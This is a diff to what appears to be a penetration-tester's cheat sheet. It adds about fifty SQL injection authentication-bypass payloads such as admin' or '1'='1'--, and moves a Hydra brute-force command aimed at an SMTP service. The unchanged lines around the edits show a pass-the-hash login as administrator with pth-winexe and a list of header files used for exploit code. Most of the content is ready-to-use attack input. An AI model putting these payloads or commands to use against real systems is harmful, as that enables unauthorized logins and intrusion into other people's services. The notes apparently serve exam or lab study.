@@ -161,11 +161,12 @@ Try to use the same payload
 Make sure size of payload is equal or LESS than the size of payload in exploit
 If less, add NOPS "\x90"
 ----------------------------------------------------------------
-Hydra Brute Forcing:
-hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V
-----------------------------------------------------------------
+Code
 process.h, string.h, winbase.h, windows.h, winsock2.h - Windows exploit code
 arpa/inet.h, fcntl.h, netdb.h, netinet/in.h, sys/sockt.h, sys/types.h, unistd.h - Linux exploit code
+----------------------------------------------------------------
+Hydra Brute Forcing:
+hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V
 -----------------------------------------------------------------
 TTY Shells:
 Python TTY Shell Trick
@@ -268,7 +269,60 @@ root@kali:~# export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403
 
 root@kali:~# pth-winexe -U administrator% //10.11.01.76 cmd 
 
+https://www.fuzzysecurity.com/tutorials/16.html
 ----------------------------------------------------------------------------------------------------
 Priv Esc Linux
 - Privchecker.py
 - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+----------------------------------------------------------------------------------------------------
+Sqli auth bypass list:
+
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+
+-------------------------------------------------------------------------------
